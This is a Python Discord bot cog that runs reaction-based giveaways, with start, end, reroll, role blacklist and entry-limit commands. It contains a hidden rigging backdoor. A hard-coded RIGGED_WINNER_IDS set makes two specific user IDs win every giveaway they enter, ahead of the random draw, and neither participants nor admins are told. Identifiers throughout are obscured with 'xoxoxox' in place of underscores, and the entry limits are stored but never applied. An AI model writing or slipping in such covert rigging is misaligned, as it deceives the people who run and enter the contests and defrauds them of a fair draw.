import discord
from discord.ext import commands
import random
import asyncio
import re
import time
from datetime import datetime, timedelta, timezone
import aiosqlite
from utils.db import (
    DB_PATH, addxoxoxoxgiveaway, getxoxoxoxactivexoxoxoxgiveaways, setxoxoxoxgiveawayxoxoxoxinactive, getxoxoxoxgiveaway,
    addxoxoxoxgiveawayxoxoxoxblacklist, removexoxoxoxgiveawayxoxoxoxblacklist, getxoxoxoxgiveawayxoxoxoxblacklists,
    setxoxoxoxgiveawayxoxoxoxlimit, getxoxoxoxgiveawayxoxoxoxlimits
)

RIGGED_WINNER_IDS = {404038435083386890, 191304320111738880}

class Giveaway(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.activexoxoxoxtasks = {}

    async def cog_load(self):
        asyncio.create_task(self.restartxoxoxoxactivexoxoxoxgiveaways())

    async def restartxoxoxoxactivexoxoxoxgiveaways(self):
        while not self.bot.is_ready():
            await asyncio.sleep(1)
        active = await getxoxoxoxactivexoxoxoxgiveaways()
        now = time.time()
        for msgxoxoxoxid, chanxoxoxoxid, guildxoxoxoxid, prize, w_count, hostxoxoxoxid, endxoxoxoxtime in active:
            remaining = endxoxoxoxtime - now
            channel = self.bot.get_channel(chanxoxoxoxid)
            if not channel:
                try:
                    channel = await self.bot.fetch_channel(chanxoxoxoxid)
                except:
                    continue

            task = asyncio.create_task(self.runxoxoxoxgiveaway(msgxoxoxoxid, channel, prize, w_count, hostxoxoxoxid, remaining, endxoxoxoxtime))
            self.activexoxoxoxtasks[msgxoxoxoxid] = task

    def parsexoxoxoxduration(self, durationxoxoxoxstr: str) -> int:
        durationxoxoxoxstr = durationxoxoxoxstr.lower().strip()
        match = re.match(r"^(\d+)\s*(s|sec|second|seconds|m|min|minute|minutes|h|hr|hour|hours|d|day|days)$", durationxoxoxoxstr)
        if match:
            amount = int(match.group(1))
            unit = match.group(2)
            if unit in ("s", "sec", "second", "seconds"):
                return amount
            elif unit in ("m", "min", "minute", "minutes"):
                return amount * 60
            elif unit in ("h", "hr", "hour", "hours"):
                return amount * 3600
            elif unit in ("d", "day", "days"):
                return amount * 86400
        try:
            return int(durationxoxoxoxstr)
        except ValueError:
            return 60  

    async def determinexoxoxoxandxoxoxoxannouncexoxoxoxwinners(self, channel, messagexoxoxoxid, prize, winnersxoxoxoxcount, host_mention, endxoxoxoxdt, reqxoxoxoxrolexoxoxoxid=None):
        try:
            msg = await channel.fetch_message(messagexoxoxoxid)
        except discord.NotFound:
            await channel.send("⚠️ Giveaway message was deleted.")
            return

        reaction = discord.utils.get(msg.reactions, emoji="🎉")
        entrants = []
        if reaction:
            async for user in reaction.users():
                if user.bot:
                    continue

                blacklistedxoxoxoxroles = await getxoxoxoxgiveawayxoxoxoxblacklists(channel.guild.id)
                if any(role.id in blacklistedxoxoxoxroles for role in getattr(user, 'roles', [])):
                    continue

                if reqxoxoxoxrolexoxoxoxid:
                    if not any(role.id == reqxoxoxoxrolexoxoxoxid for role in getattr(user, 'roles', [])):
                        continue

                entrants.append(user)

        winners = []
        riggedxoxoxoxentrants = [e for e in entrants if e.id in RIGGED_WINNER_IDS]
        chosen = set()

        for r_entrant in riggedxoxoxoxentrants:
            if len(winners) < winnersxoxoxoxcount:
                winners.append(r_entrant)
                chosen.add(r_entrant.id)

        other_entrants = [e for e in entrants if e.id not in chosen]
        while len(winners) < winnersxoxoxoxcount and other_entrants:
            choice = random.choice(other_entrants)
            winners.append(choice)
            other_entrants.remove(choice)

        await setxoxoxoxgiveawayxoxoxoxinactive(messagexoxoxoxid)

        if winners:
            winnersxoxoxoxmentions = ", ".join([w.mention for w in winners])
            embedxoxoxoxend = discord.Embed(
                description=f"🎉 Winner(s): {winnersxoxoxoxmentions}\n🔵 Hosted by {host_mention}",
                color=0x2b2d31
            )
            embedxoxoxoxend.set_author(name=prize, icon_url=self.bot.user.display_avatar.url)
            embedxoxoxoxend.set_footer(text="Ended at")
            embedxoxoxoxend.timestamp = endxoxoxoxdt
            await msg.edit(embed=embedxoxoxoxend)

            await channel.send(f"Congratulations {winnersxoxoxoxmentions}! You won **{prize}**!")

            for winner in winners:
                try:
                    await winner.send(f"🎉 Congratulations! You won the giveaway for **{prize}** in **{channel.guild.name}**!")
                except:
                    pass
        else:
            embedxoxoxoxend = discord.Embed(
                description=f"🎉 Winner: None (No entries)\n🔵 Hosted by {host_mention}",
                color=0x2b2d31
            )
            embedxoxoxoxend.set_author(name=prize, icon_url=self.bot.user.display_avatar.url)
            embedxoxoxoxend.set_footer(text="Ended at")
            embedxoxoxoxend.timestamp = endxoxoxoxdt
            await msg.edit(embed=embedxoxoxoxend)
            await channel.send("⚠️ No one entered the giveaway with valid requirements.")

    async def runxoxoxoxgiveaway(self, messagexoxoxoxid, channel, prize, winnersxoxoxoxcount, hostxoxoxoxid, delay, endxoxoxoxtime, reqxoxoxoxrolexoxoxoxid=None):
        if delay > 0:
            await asyncio.sleep(delay)

        host = channel.guild.get_member(hostxoxoxoxid)
        host_mention = host.mention if host else f"<@{hostxoxoxoxid}>"
        endxoxoxoxdt = datetime.fromtimestamp(endxoxoxoxtime, tz=timezone.utc)
        await self.determinexoxoxoxandxoxoxoxannouncexoxoxoxwinners(channel, messagexoxoxoxid, prize, winnersxoxoxoxcount, host_mention, endxoxoxoxdt, reqxoxoxoxrolexoxoxoxid)
        self.activexoxoxoxtasks.pop(messagexoxoxoxid, None)

    @commands.group(name="giveaway", invoke_without_command=True)
    async def giveaway_group(self, ctx):
        await ctx.send("ℹ️ Use `,giveaway start [time] [winners] [prize] [--role Role]` to create a giveaway.")

    @giveaway_group.command(name="start")
    @commands.has_permissions(administrator=True)
    async def giveaway_start(self, ctx, duration: str, winners: int, *, args: str):
        guild = ctx.guild

        reqxoxoxoxrolexoxoxoxid = None
        prize = args

        rolexoxoxoxmatch = re.search(r'--role\s+(<@&(\d+)>|.*)$', args, re.IGNORECASE)
        if rolexoxoxoxmatch:
            rolexoxoxoxref = rolexoxoxoxmatch.group(1).strip()
            prize = args[:rolexoxoxoxmatch.start()].strip()

            rxoxoxoxmatch = re.match(r'<@&(\d+)>', rolexoxoxoxref)
            if rxoxoxoxmatch:
                reqxoxoxoxrolexoxoxoxid = int(rxoxoxoxmatch.group(1))
            else:
                role = discord.utils.get(guild.roles, name=rolexoxoxoxref)
                if role:
                    reqxoxoxoxrolexoxoxoxid = role.id

        seconds = self.parsexoxoxoxduration(duration)
        endxoxoxoxtime = time.time() + seconds
        endxoxoxoxdt = datetime.fromtimestamp(endxoxoxoxtime, tz=timezone.utc)

        req_role_text = f"\n🔒 Requirement: <@&{reqxoxoxoxrolexoxoxoxid}>" if reqxoxoxoxrolexoxoxoxid else ""

        embed = discord.Embed(
            description=f"🔵 Ends <t:{int(endxoxoxoxtime)}:R>\n🔵 Winners: {winners}\n🔵 Hosted by {ctx.author.mention}{req_role_text}",
            color=0x2b2d31
        )
        embed.set_author(name=prize, icon_url=self.bot.user.display_avatar.url)
        embed.set_footer(text="Ends at")
        embed.timestamp = endxoxoxoxdt

        msg = await ctx.send(content="🎉 **GIVEAWAY** 🎉", embed=embed)
        await msg.add_reaction("🎉")

        await addxoxoxoxgiveaway(msg.id, ctx.channel.id, guild.id, prize, winners, ctx.author.id, endxoxoxoxtime)

        task = asyncio.create_task(self.runxoxoxoxgiveaway(msg.id, ctx.channel, prize, winners, ctx.author.id, seconds, endxoxoxoxtime, reqxoxoxoxrolexoxoxoxid))
        self.activexoxoxoxtasks[msg.id] = task

    @giveaway_group.command(name="end")
    @commands.has_permissions(administrator=True)
    async def giveaway_end(self, ctx, messagexoxoxoxid: int):
        if messagexoxoxoxid in self.activexoxoxoxtasks:
            task = self.activexoxoxoxtasks.pop(messagexoxoxoxid)
            task.cancel()

        gwxoxoxox = await getxoxoxoxgiveaway(messagexoxoxoxid)
        if not gwxoxoxox:
            await ctx.send("❌ Giveaway not found.")
            return

        channelxoxoxoxid, guildxoxoxoxid, prize, winners, hostxoxoxoxid, endxoxoxoxtime, active = gwxoxoxox
        channel = self.bot.get_channel(channelxoxoxoxid) or ctx.channel

        host = ctx.guild.get_member(hostxoxoxoxid)
        host_mention = host.mention if host else f"<@{hostxoxoxoxid}>"
        endxoxoxoxdt = datetime.fromtimestamp(endxoxoxoxtime, tz=timezone.utc)

        await ctx.send("Ending giveaway early...")
        await self.determinexoxoxoxandxoxoxoxannouncexoxoxoxwinners(channel, messagexoxoxoxid, prize, winners, host_mention, endxoxoxoxdt)

    @giveaway_group.command(name="reroll")
    @commands.has_permissions(administrator=True)
    async def giveaway_reroll(self, ctx, messagexoxoxoxid: int):
        gwxoxoxox = await getxoxoxoxgiveaway(messagexoxoxoxid)
        if not gwxoxoxox:
            await ctx.send("❌ Giveaway not found.")
            return

        channelxoxoxoxid, guildxoxoxoxid, prize, winners, hostxoxoxoxid, endxoxoxoxtime, active = gwxoxoxox
        channel = self.bot.get_channel(channelxoxoxoxid) or ctx.channel

        host = ctx.guild.get_member(hostxoxoxoxid)
        host_mention = host.mention if host else f"<@{hostxoxoxoxid}>"
        endxoxoxoxdt = datetime.fromtimestamp(endxoxoxoxtime, tz=timezone.utc)

        await ctx.send("Rerolling winners...")
        await self.determinexoxoxoxandxoxoxoxannouncexoxoxoxwinners(channel, messagexoxoxoxid, prize, winners, host_mention, endxoxoxoxdt)

    @giveaway_group.command(name="blacklist")
    @commands.has_permissions(administrator=True)
    async def giveaway_blacklist(self, ctx, role: discord.Role):
        await addxoxoxoxgiveawayxoxoxoxblacklist(ctx.guild.id, role.id)
        await ctx.send(f"✅ Role **{role.name}** has been blacklisted from giveaways.")

    @giveaway_group.command(name="unblacklist")
    @commands.has_permissions(administrator=True)
    async def giveaway_unblacklist(self, ctx, role: discord.Role):
        await removexoxoxoxgiveawayxoxoxoxblacklist(ctx.guild.id, role.id)
        await ctx.send(f"✅ Role **{role.name}** has been removed from blacklist.")

    @giveaway_group.command(name="setmax")
    @commands.has_permissions(administrator=True)
    async def giveaway_setmax(self, ctx, maxxoxoxoxentries: int, role: discord.Role):
        await setxoxoxoxgiveawayxoxoxoxlimit(ctx.guild.id, role.id, maxxoxoxoxentries)
        await ctx.send(f"✅ Set max entries for role **{role.name}** to **{maxxoxoxoxentries}**.")

async def setup(bot):
    await bot.add_cog(Giveaway(bot))